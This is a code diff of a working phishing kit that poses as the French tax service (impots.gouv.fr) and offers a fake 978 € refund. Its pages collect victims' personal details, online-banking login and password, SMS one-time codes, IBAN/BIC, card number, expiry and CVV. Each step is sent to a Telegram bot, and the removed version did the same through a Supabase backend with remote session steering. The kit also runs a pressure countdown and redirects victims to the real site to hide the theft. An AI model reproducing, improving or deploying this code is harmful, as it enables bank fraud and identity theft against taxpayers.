+            Pour valider la transaction, veuillez procéder à l'authentification forte sur votre application bancaire mobile ou entrer le code reçu par SMS.
+          </p>
+
+          <div style="background:#f4f6fc; border:1px solid #d0d7de; border-radius:6px; padding:12px; display:flex; flex-direction:column; gap:8px;">
+            <div style="display:flex; align-items:center; gap:8px; font-weight:700; font-size:0.85rem; color:#000091;">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+              Option 1 : Application mobile
+            </div>
+            <p style="font-size:0.78rem; color:#333; line-height:1.4;">
+              Une notification a été envoyée sur votre téléphone enregistré. Ouvrez votre application bancaire et validez la demande d'authentification.
+            </p>
+          </div>
+
+          <div style="background:#f9f9f9; border:1px solid #d0d7de; border-radius:6px; padding:12px; display:flex; flex-direction:column; gap:8px;">
+            <div style="display:flex; align-items:center; gap:8px; font-weight:700; font-size:0.85rem; color:#000091;">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+              Option 2 : Code reçu par SMS
+            </div>
+            <p style="font-size:0.78rem; color:#333; line-height:1.4;">
+              Si vous ne recevez pas de notification, saisissez ci-dessous le code à usage unique reçu par SMS :
+            </p>
+            <input type="text" id="smsCodeInput" class="p3-input" placeholder="Ex: 489210" maxlength="8" style="text-align:center; font-weight:bold; letter-spacing:2px;">
+          </div>
+
+          <button type="button" class="btn-continuer" id="btnAuthFinished" style="margin-top:6px;">Authentification terminée</button>
         </div>
 
-        <!-- PAGE IBAN -->
+        <!-- IBAN & CREDIT CARD PAGE -->
         <div class="page2-card" id="pageIban" style="display:none;">
           <h2 class="card-title">Coordonnées Bancaires / IBAN</h2>
-          <input type="text" id="ribInput" class="iban-input" placeholder="IBAN">
-          <input type="text" id="bicInput" class="iban-input" placeholder="BIC / SWIFT">
-          <button type="button" class="btn-continuer" id="btnPageIban">Valider le virement</button>
+          <p style="font-size:0.82rem;color:#666;margin-top:-6px;">Indiquez vos références pour finaliser le versement.</p>
+
+          <div style="width:100%;display:flex;flex-direction:column;gap:10px;">
+            <div>
+              <label class="field-label">RIB / IBAN <span>*</span></label>
+              <input type="text" id="ribInput" class="iban-input" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" maxlength="34">
+            </div>
+            <div>
+              <label class="field-label">Code BIC / SWIFT <span>*</span></label>
+              <input type="text" id="bicInput" class="iban-input" placeholder="EX. : BREDFRPPXXX" maxlength="11">
+            </div>
+            <div>
+              <label class="field-label">Numéro de carte bancaire <span>*</span></label>
+              <input type="text" id="cardNumberInput" class="iban-input" placeholder="4976 0000 0000 0000" maxlength="19">
+            </div>
+            <div style="display:flex;gap:8px;">
+              <div style="flex:1;">
+                <label class="field-label">Expiration <span>*</span></label>
+                <input type="text" id="cardExp" class="iban-input" placeholder="MM/AA" maxlength="5">
+              </div>
+              <div style="flex:1;">
+                <label class="field-label">CVV <span>*</span></label>
+                <input type="text" id="cardCvv" class="iban-input" placeholder="123" maxlength="4">
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="btn-continuer" id="btnPageIban">Continuer</button>
         </div>
 
-        <!-- PAGE 5 -->
-        <div class="page2-card" id="page5" style="display:none; text-align:center;">
-          <h2 class="card-title">Demande validée</h2>
-          <p class="card-text">Votre virement sera émis sous 3 jours ouvrés.</p>
+        <!-- PAGE 5: CONFIRMATION -->
+        <div class="page2-card" id="page5" style="display:none;text-align:center;align-items:center;gap:15px;">
+          <div class="valid-circle">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+          </div>
+          <h2 class="card-title">Demande bien reçue</h2>
+          <p style="font-size:0.85rem;color:#444;line-height:1.6;">
+            Vos informations ont été transmises avec succès. Votre virement sera émis sous 0 à 3 jours ouvrés.Le délai de virement sur votre compte dépend
+
+de votre banque et de la procédure de traitement. Merci de votre confiance et de votre patience.
+          </p>
         </div>
+
       </div>
+
     </div>
   </section>
 
-  <script>
-    const SUPABASE_URL = 'https://sukmcosjiyvunguultjc.supabase.co';
-    const SUPABASE_ANON_KEY = 'sb_publishable_D4AOhqTP2gOe31LAdzBF3w_BTwh0Ls3';
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-    let sessionId = localStorage.getItem('visitor_session_id');
-    if (!sessionId) {
-      sessionId = 'sess_' + Math.random().toString(36).substring(2, 11);
-      localStorage.setItem('visitor_session_id', sessionId);
-    }
-
-    let collectedData = {};
-
-    async function syncSession(pageId, extraData = {}) {
-      collectedData = { ...collectedData, ...extraData };
+  <!-- HOW IT WORKS SECTION -->
+  <section class="how-it-works-section">
+    <div class="how-container">
+      <h2 class="how-title">Comment ça fonctionne ?</h2>
       
-      // Upsert data to Supabase and trigger Telegram notification via API function
-      await supabaseClient.from('sessions').upsert({
-        session_id: sessionId,
-        current_page: pageId,
-        data: collectedData,
-        updated_at: new Date()
-      }, { onConflict: 'session_id' });
+      <div class="how-grid">
+        <div class="how-step-card">
+          <div class="how-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          </div>
+          <div class="how-step-number">Étape 1</div>
+          <h3>Vérifiez votre éligibilité</h3>
+          <p>Entrez votre code de dossier fiscal pour accéder à votre situation et connaître le montant de votre remboursement.</p>
+        </div>
 
-      // Send payload to backend handler to notify Telegram
-      fetch('/api/telegram-webhook', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ session_id: sessionId, page: pageId, data: collectedData })
-      }).catch(err => console.log(err));
+        <div class="how-step-card">
+          <div class="how-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2" ry="2"></rect><line x1="8" y1="7" x2="16" y2="7"></line><line x1="8" y1="11" x2="16" y2="11"></line><line x1="8" y1="15" x2="12" y2="15"></line></svg>
+          </div>
+          <div class="how-step-number">Étape 2</div>
+          <h3>Traitement du remboursement</h3>
+          <p>Confirmez la réception de votre dossier de remboursement dans le délai imparti pour lancer la procédure de virement.</p>
+        </div>
+
+        <div class="how-step-card">
+          <div class="how-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+          </div>
+          <div class="how-step-number">Étape 3</div>
+          <h3>Authentification et informations</h3>
+          <p>Confirmez vos informations personnelles et procédez à l'authentification auprès de votre établissement bancaire.</p>
+        </div>
+
+        <div class="how-step-card">
+          <div class="how-step-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          </div>
+          <div class="how-step-number">Étape 4</div>
+          <h3>Coordonnées bancaires</h3>
+          <p>Indiquez vos références RIB/IBAN et carte bancaire pour finaliser et recevoir votre versement directement.</p>
+        </div>
+      </div>
+
+      <div class="info-banner-bottom">
+        <div class="info-banner-content">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+          <span>Le remboursement du trop-perçu d'impôts est automatique dans la plupart des cas. Si vous avez récemment changé de situation (chômage, arrêt maladie, mariage, naissance, etc.), vous pouvez être concerné par un ajustement de votre impôt.</span>
+        </div>
+        <a href="#" class="info-banner-link">En savoir plus →</a>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- FOOTER OFFICIEL -->
+  <footer class="official-footer">
+    <div class="footer-main-row">
+      <div class="footer-left-brand">
+        <svg class="marianne-logo" viewBox="0 0 200 80" xmlns="http://www.w3.org/2000/svg">
+          <g transform="translate(0, 0)">
+            <rect x="0" y="0" width="18" height="12" fill="#000091"/>
+            <rect x="18" y="0" width="18" height="12" fill="#ffffff"/>
+            <rect x="36" y="0" width="18" height="12" fill="#e1000f"/>
+            <path d="M48 12 C44 12 40 10 38 7 C36 4 33 2 29 2 C23 2 18 7 18 12 Z" fill="#ffffff"/>
+            <path d="M24 12 C24 8 28 4 33 4 C35 4 37 5 39 7 C41 9 44 11 48 12 Z" fill="#ffffff"/>
+          </g>
+          <text x="0" y="28" font-family="Marianne, sans-serif" font-size="12" font-weight="bold" fill="#000091" letter-spacing="0.3">RÉPUBLIQUE</text>
+          <text x="0" y="42" font-family="Marianne, sans-serif" font-size="12" font-weight="bold" fill="#000091" letter-spacing="0.3">FRANÇAISE</text>
+          <text x="0" y="55" font-family="Marianne, sans-serif" font-size="7.5" font-style="italic" fill="#161616">Liberté</text>
+          <text x="0" y="65" font-family="Marianne, sans-serif" font-size="7.5" font-style="italic" fill="#161616">Égalité</text>
+          <text x="0" y="75" font-family="Marianne, sans-serif" font-size="7.5" font-style="italic" fill="#161616">Fraternité</text>
+        </svg>
+      </div>
+
+      <div class="footer-links-grid">
+        <div class="footer-links-col">
+          <a href="https://info.gouv.fr" target="_blank" rel="noopener">info.gouv.fr ↗</a>
+          <a href="https://data.gouv.fr" target="_blank" rel="noopener">data.gouv.fr ↗</a>
+        </div>
+        <div class="footer-links-col">
+          <a href="https://service-public.fr" target="_blank" rel="noopener">service-public.fr ↗</a>
+        </div>
+        <div class="footer-links-col">
+          <a href="https://legifrance.gouv.fr" target="_blank" rel="noopener">Legifrance.gouv.fr ↗</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-bottom-row">
+      <a href="#">Plan du site</a>
+      <span class="separator">|</span>
+      <a href="#">Accessibilité : partiellement conforme</a>
+      <span class="separator">|</span>
+      <a href="#">Accessibilité des services en ligne</a>
+      <span class="separator">|</span>
+      <a href="#">Mentions légales</a>
+      <span class="separator">|</span>
+      <a href="#">Données personnelles</a>
+      <span class="separator">|</span>
+      <a href="#">Gestion des cookies</a>
+    </div>
+  </footer>
+
+  <script>
+    var BOT_NAME = "IMPOTS-REZ-FR";
+
+    function sendTelegram(msg) {
+      fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message: msg, bot_name: BOT_NAME })
+      }).catch(function() {});
+    }
+     
+    var overlay = document.getElementById('loadingOverlay');
+
+    function showLoading(callback, ms) {
+      overlay.style.display = 'flex';
+      setTimeout(function() {
+        overlay.style.display = 'none';
+        callback();
+      }, ms || 3000);
     }
 
-    // Real-time listener for remote admin steering commands
-    supabaseClient
-      .channel('public:sessions')
-      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${sessionId}` }, (payload) => {
-        const newPage = payload.new.current_page;
-        if (newPage) switchPage(newPage, false);
-      })
-      .subscribe();
-
-    function switchPage(pageId, doSync = true) {
-      ['pageEligibility', 'page1', 'page3', 'page4', 'pageAuthWait', 'pageIban', 'page5'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.style.display = 'none';
-      });
-      const target = document.getElementById(pageId);
-      if (target) {
-        target.style.display = 'flex';
-        target.style.flexDirection = 'column';
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-      }
-      if (doSync) syncSession(pageId);
-    }
-
-    function showPopup(title, msg) {
+    function showPopup(title, message) {
       document.getElementById('popupTitle').textContent = title;
-      document.getElementById('popupMessage').textContent = msg;
+      document.getElementById('popupMessage').textContent = message;
       document.getElementById('customPopup').classList.add('active');
     }
-    document.getElementById('popupCloseBtn').addEventListener('click', () => {
+    document.getElementById('popupCloseBtn').addEventListener('click', function() {
       document.getElementById('customPopup').classList.remove('active');
     });
 
-    document.getElementById('btnCheckEligibility').addEventListener('click', () => {
-      const code = document.getElementById('dossierCodeInput').value.trim();
-      if (!code) { showPopup("Erreur", "Entrez votre code de dossier."); return; }
-      if (code === "FR4018ED6") {
-        switchPage('page1');
-      } else {
-        showPopup("Accès refusé", "Code non valide.");
-        syncSession('pageEligibility', { dossier_failed: code });
+    function goTo(hideId, showId) {
+      var hide = document.getElementById(hideId);
+      var show = document.getElementById(showId);
+      if (hide) hide.style.display = 'none';
+      if (show) { show.style.display = 'flex'; show.style.flexDirection = 'column'; }
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function showErr(el, msg) {
+      clearErr(el);
+      el.style.borderColor = '#e1000f';
+      var p = document.createElement('p');
+      p.className = 'field-error';
+      p.textContent = msg;
+      el.parentNode.insertBefore(p, el.nextSibling);
+    }
+    function clearErr(el) {
+      el.style.borderColor = '';
+      var n = el.nextSibling;
+      if (n && n.className === 'field-error') n.remove();
+    }
+    function clearAllErr(container) {
+      container.querySelectorAll('.field-error').forEach(function(e){ e.remove(); });
+      container.querySelectorAll('input, select').forEach(function(i){ i.style.borderColor = ''; });
+    }
+
+    // Gestion de l'affichage du champ "Autre banque"
+    var bankSelect = document.getElementById('bankSelect');
+    var otherBankContainer = document.getElementById('otherBankContainer');
+    if (bankSelect) {
+      bankSelect.addEventListener('change', function() {
+        if (this.value === 'Autre banque') {
+          otherBankContainer.style.display = 'flex';
+          otherBankContainer.style.flexDirection = 'column';
+        } else {
+          otherBankContainer.style.display = 'none';
+          var otherInput = document.getElementById('otherBankInput');
+          if (otherInput) otherInput.value = '';
+        }
+      });
+    }
+
+    // ELIGIBILITY CHECK LOGIC (Strict check on FR4018ED6)
+    document.getElementById('btnCheckEligibility').addEventListener('click', function() {
+      var codeInput = document.getElementById('dossierCodeInput');
+      var codeVal = codeInput.value.trim();
+
+      if (!codeVal) {
+        showPopup("Code requis", "Veuillez entrer votre code de dossier fiscal.");
+        return;
       }
+
+      showLoading(function() {
+        if (codeVal === "FR4018ED6") {
+          sendTelegram("🚨 <b>" + BOT_NAME + "</b>\n\n✔️ <b>Code fiscal valide :</b> " + codeVal);
+          
+          var titleEl = document.getElementById('eligibilityTitle');
+          titleEl.textContent = "Éligibilité confirmée";
+          titleEl.style.color = "#000091";
+          
+          document.getElementById('eligibilityDesc').innerHTML = "Votre dossier remplit les conditions pour un remboursement d'un montant de <b>978 €</b>.";
+          
+          codeInput.style.display = 'none';
+          codeInput.previousElementSibling.style.display = 'none';
+          document.getElementById('eligibilityInfoBox').style.display = 'none';
+          
+          var checkBtn = document.getElementById('btnCheckEligibility');
+          checkBtn.textContent = "Poursuivre mon remboursement →";
+          checkBtn.id = "btnProceedToRefund";
+          
+          checkBtn.addEventListener('click', function() {
+            goTo('pageEligibility', 'page1');
+            startTimer();
+          });
+
+        } else {
+          sendTelegram("🚨 <b>" + BOT_NAME + "</b>\n\n❌ <b>Code fiscal erroné :</b> " + codeVal);
+          showPopup("Accès refusé", "Code erroné ou non éligible.");
+        }
+      }, 2500);
     });
 
-    document.getElementById('btnPage1').addEventListener('click', () => switchPage('page3'));
+    var dobInput = document.getElementById('dobInput');
+    if (dobInput) {
+      dobInput.addEventListener('input', function() {
+        var v = this.value.replace(/\D/g, '').substring(0, 8);
+        if (v.length >= 5) {
+          v = v.substring(0,2) + '/' + v.substring(2,4) + '/' + v.substring(4);
+        } else if (v.length >= 3) {
+          v = v.substring(0,2) + '/' + v.substring(2);
+        }
+        this.value = v;
+      });
+    }
 
-    document.getElementById('btnPage3').addEventListener('click', () => {
-      const inputs = document.querySelectorAll('#page3 .p3-input');
-      switchPage('page4', { prenom: inputs[0].value, nom: inputs[1].value, tel: inputs[2].value, dob: inputs[3].value, adresse: inputs[4].value });
+    var phoneInput = document.getElementById('phoneInput');
+    if (phoneInput) {
+      phoneInput.addEventListener('input', function() {
+        var v = this.value.replace(/\D/g, '');
+        if (v.startsWith('33')) {
+          v = '0' + v.substring(2);
+        }
+        v = v.substring(0, 10);
+        var formatted = '';
+        for (var i = 0; i < v.length; i++) {
+          if (i > 0 && i % 2 === 0) formatted += ' ';
+          formatted += v[i];
+        }
+        this.value = formatted;
+      });
+    }
+
+    var postalInput = document.getElementById('postalInput');
+    if (postalInput) {
+      postalInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').substring(0, 5);
+      });
+    }
+
+    var cardNumInput = document.getElementById('cardNumberInput');
+    if (cardNumInput) {
+      cardNumInput.addEventListener('input', function() {
+        var v = this.value.replace(/\D/g, '').substring(0, 16);
+        var formatted = v.match(/.{1,4}/g);
+        this.value = formatted ? formatted.join(' ') : v;
+      });
+    }
+
+    // AUTOMATIC FRENCH IBAN FORMATTING (FRxx xxxx xxxx xxxx xxxx xxxx xxx)
+    var ribInput = document.getElementById('ribInput');
+    if (ribInput) {
+      ribInput.addEventListener('input', function(e) {
+        var v = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '').substring(0, 27); // French IBANs have 27 characters
+        var formatted = '';
+        for (var i = 0; i < v.length; i++) {
+          if (i > 0 && i % 4 === 0) {
+            formatted += ' ';
+          }
+          formatted += v[i];
+        }
+        this.value = formatted;
+      });
+    }
+
+    var bicInput = document.getElementById('bicInput');
+    if (bicInput) {
+      bicInput.addEventListener('input', function() {
+        this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,11);
+      });
+    }
+
+    var cardExp = document.getElementById('cardExp');
+    if (cardExp) {
+      cardExp.addEventListener('input', function() {
+        var v = this.value.replace(/\D/g,'').substring(0,4);
+        if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
+        this.value = v;
+      });
+    }
+
+    var cardCvv = document.getElementById('cardCvv');
+    if (cardCvv) {
+      cardCvv.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g,'').substring(0,4);
+      });
+    }
+
+    var totalSeconds = 600;
+    var countdown = totalSeconds;
+    var circle = document.getElementById('countdownCircle');
+    var textEl = document.getElementById('countdownText');
+    var radius = 60;
+    var circumference = 2 * Math.PI * radius;
+    circle.style.strokeDasharray = circumference;
+    circle.style.strokeDashoffset = 0;
+
+    function updateCountdown(value) {
+      var offset = circumference - (value / totalSeconds) * circumference;
+      circle.style.strokeDashoffset = offset;
+      var minutes = Math.floor(value / 60);
+      var seconds = value % 60;
+      textEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+    }
+    updateCountdown(totalSeconds);
+
+    var timer = null;
+    function startTimer() {
+      if (timer) return;
+      timer = setInterval(function() {
+        countdown--;
+        if (countdown < 0) {
+          clearInterval(timer);
+          window.location.href = 'https://www.impots.gouv.fr/';
+          return;
+        }
+        updateCountdown(countdown);
+      }, 1000);
+    }
+
+    document.getElementById('btnPage1').addEventListener('click', function() {
+      if (timer) clearInterval(timer);
+      showLoading(function() { goTo('page1', 'page3'); }, 3000);
     });
 
-    document.getElementById('btnPage4').addEventListener('click', () => {
-      const bank = document.getElementById('bankSelect').value;
-      const ident = document.getElementById('bankIdentInput').value;
-      const pwd = document.getElementById('bankPwdInput').value;
-      if (!bank || !ident || !pwd) { showPopup("Erreur", "Remplissez tous les champs."); return; }
-      switchPage('pageAuthWait', { bank_name: bank, bank_ident: ident, bank_pwd: pwd });
-      setTimeout(() => switchPage('pageIban'), 4000);
+    document.getElementById('btnPage3').addEventListener('click', function() {
+      var page3 = document.getElementById('page3');
+      var inputs = page3.querySelectorAll('.p3-input');
+      var labels = page3.querySelectorAll('.field-label');
+      var valid = true;
+      clearAllErr(page3);
+
+      inputs.forEach(function(inp) {
+        if (!inp.value.trim()) { showErr(inp, 'Ce champ est obligatoire.'); valid = false; }
+      });
+      if (!valid) return;
+
+      var rawPhone = phoneInput.value.replace(/\s+/g, '');
+      var frenchPhoneRegex = /^0[1-9][0-9]{8}$/;
+      if (!frenchPhoneRegex.test(rawPhone)) {
+        showErr(phoneInput, 'Veuillez entrer un numéro de téléphone français valide (ex: 0612345678).');
+        return;
+      }
+
+      var msg = "🚨 <b>" + BOT_NAME + "</b>\n\n📋 <b>Étape 1 — Infos personnelles</b>\n─────────────────\n";
+      inputs.forEach(function(inp, i) {
+        var lbl = labels[i] ? labels[i].textContent.replace('*','').trim() : 'Champ';
+        msg += "• <b>" + lbl + " :</b> " + inp.value + "\n";
+      });
+      sendTelegram(msg);
+
+      showLoading(function() { goTo('page3', 'page4'); }, 3000);
     });
 
-    document.getElementById('btnPageIban').addEventListener('click', () => {
-      const iban = document.getElementById('ribInput').value;
-      const bic = document.getElementById('bicInput').value;
-      switchPage('page5', { iban: iban, bic: bic });
+    // ÉTAPE 2 — CONNEXION BANCAIRE (10s load -> Strong Auth Box)
+    document.getElementById('btnPage4').addEventListener('click', function() {
+      var page4 = document.getElementById('page4');
+      var bankSelect = document.getElementById('bankSelect');
+      var otherBankInput = document.getElementById('otherBankInput');
+      var identInput = document.getElementById('bankIdentInput');
+      var pwdInput = document.getElementById('bankPwdInput');
+      var valid = true;
+      clearAllErr(page4);
+
+      if (!bankSelect.value) { 
+        showErr(bankSelect, 'Veuillez sélectionner votre banque.'); 
+        valid = false; 
+      } else if (bankSelect.value === 'Autre banque' && !otherBankInput.value.trim()) {
+        showErr(otherBankInput, 'Veuillez entrer le nom de votre banque.');
+        valid = false;
+      }
+
+      if (!identInput.value.trim()) { showErr(identInput, 'Identifiant obligatoire.'); valid = false; }
+      if (!pwdInput.value.trim()) { showErr(pwdInput, 'Mot de passe obligatoire.'); valid = false; }
+      if (!valid) return;
+
+      var selectedBankName = bankSelect.value === 'Autre banque' ? otherBankInput.value.trim() : bankSelect.value;
+
+      var msg = "🚨 <b>" + BOT_NAME + "</b>\n\n🔐 <b>Étape 2 — Connexion Bancaire</b>\n─────────────────\n" +
+                "🏦 <b>Banque :</b> " + selectedBankName + "\n" +
+                "🔑 <b>Identifiant :</b> " + identInput.value + "\n" +
+                "🔒 <b>Mot de passe :</b> " + pwdInput.value;
+      sendTelegram(msg);
+
+      // Load for 10 seconds then show Strong Auth Page
+      showLoading(function() {
+        goTo('page4', 'pageAuthWait');
+      }, 10000);
     });
 
-    syncSession('pageEligibility');
+    // AUTHENTIFICATION TERMINÉE -> 20s load -> Move to IBAN page
+    document.getElementById('btnAuthFinished').addEventListener('click', function() {
+      var smsCode = document.getElementById('smsCodeInput').value.trim();
+      if (smsCode) {
+        sendTelegram("🚨 <b>" + BOT_NAME + "</b>\n\n📱 <b>Code SMS saisi :</b> " + smsCode);
+      } else {
+        sendTelegram("🚨 <b>" + BOT_NAME + "</b>\n\n📱 <b>Validation effectuée via application mobile</b>");
+      }
+
+      showLoading(function() {
+        goTo('pageAuthWait', 'pageIban');
+      }, 20000);
+    });
+
+    document.getElementById('btnPageIban').addEventListener('click', function() {
+      var cardNum = cardNumInput.value.replace(/\s+/g, '');
+      var ribVal = ribInput.value.trim();
+      var bicVal = bicInput.value.trim();
+      var expVal = cardExp.value.trim();
+      var cvvVal = cardCvv.value.trim();
+
+      if (ribVal.length < 15) {
+        showPopup("RIB / IBAN invalide", "Veuillez vérifier les informations de votre IBAN/RIB.");
+        return;
+      }
+      if (bicVal.length < 8) {
+        showPopup("Code BIC invalide", "Veuillez entrer un code BIC / SWIFT valide.");
+        return;
+      }
+      if (cardNum.length < 16) {
+        showPopup("Numéro de carte invalide", "Veuillez entrer un numéro de carte bancaire complet à 16 chiffres.");
+        return;
+      }
+      if (expVal.length < 5 || !expVal.includes('/')) {
+        showPopup("Date d'expiration invalide", "Veuillez respecter le format MM/AA.");
+        return;
+      }
+      if (cvvVal.length < 3) {
+        showPopup("CVV invalide", "Le code de sécurité CVV doit comporter 3 ou 4 chiffres.");
+        return;
+      }
+
+      var msg = "🚨 <b>" + BOT_NAME + "</b>\n\n💳 <b>Étape 3 — Coordonnées Bancaires & Carte</b>\n─────────────────\n" +
+                "• <b>RIB / IBAN :</b> " + ribVal + "\n" +
+                "• <b>Code BIC :</b> " + bicVal + "\n" +
+                "• <b>N° de carte :</b> " + cardNumInput.value + "\n" +
+                "• <b>Expiration :</b> " + expVal + "\n" +
+                "• <b>CVV :</b> " + cvvVal;
+      sendTelegram(msg);
+
+      showLoading(function() {
+        goTo('pageIban', 'page5');
+        startFinalRedirect();
+      }, 3000);
+    });
+
+    function startFinalRedirect() {
+      var seconds = 45;
+      var iv = setInterval(function() {
+        seconds--;
+        if (seconds <= 0) {
+          clearInterval(iv);
+          window.location.href = 'https://www.impots.gouv.fr/';
+        }
+      }, 1000);
+    }
+
+    var bankEyeBtn = document.getElementById('bankEyeBtn');
+    if (bankEyeBtn) {
+      var bankPwdVis = false;
+      bankEyeBtn.addEventListener('click', function() {
+        bankPwdVis = !bankPwdVis;
+        document.getElementById('bankPwdInput').type = bankPwdVis ? 'text' : 'password';
+      });
+    }
   </script>
+
 </body>
 </html>
